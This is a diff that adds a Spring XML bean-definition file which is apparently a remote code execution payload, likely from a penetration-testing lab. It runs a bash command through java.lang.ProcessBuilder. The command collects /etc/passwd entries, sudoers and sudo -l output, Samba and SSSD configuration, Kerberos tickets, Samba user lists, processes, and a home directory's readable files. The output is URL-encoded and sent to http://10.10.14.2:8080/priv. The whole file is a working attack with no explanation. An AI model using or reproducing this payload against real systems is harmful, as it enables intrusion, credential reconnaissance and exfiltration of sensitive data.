@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[echo "=PASSWD="; cat /etc/passwd | grep -v nologin | grep -v false; echo "=SUDOERS="; cat /etc/sudoers 2>/dev/null; ls /etc/sudoers.d/ 2>/dev/null; echo "=SUDO_L="; sudo -l 2>/dev/null; echo "=SAMBA_CONF="; cat /etc/samba/smb.conf 2>/dev/null | head -50; echo "=SSSD="; cat /etc/sssd/sssd.conf 2>/dev/null; echo "=KRB_TICKETS="; ls -la /tmp/*.ccache /tmp/krb5* 2>/dev/null; klist 2>/dev/null; echo "=SAMBA_PRIVATE="; ls -la /var/lib/samba/private/ 2>/dev/null; echo "=SAMBA_USERS="; pdbedit -L 2>/dev/null; samba-tool user list 2>/dev/null; echo "=PROCESSES="; ps aux | grep -v "\[" | head -30; echo "=SHADOW_READABLE="; ls -la /etc/shadow 2>/dev/null; echo "=ANNE_FILES="; find /home/anne -readable 2>/dev/null; echo "=ID="; id; echo "=GROUPS="; groups]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/priv?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
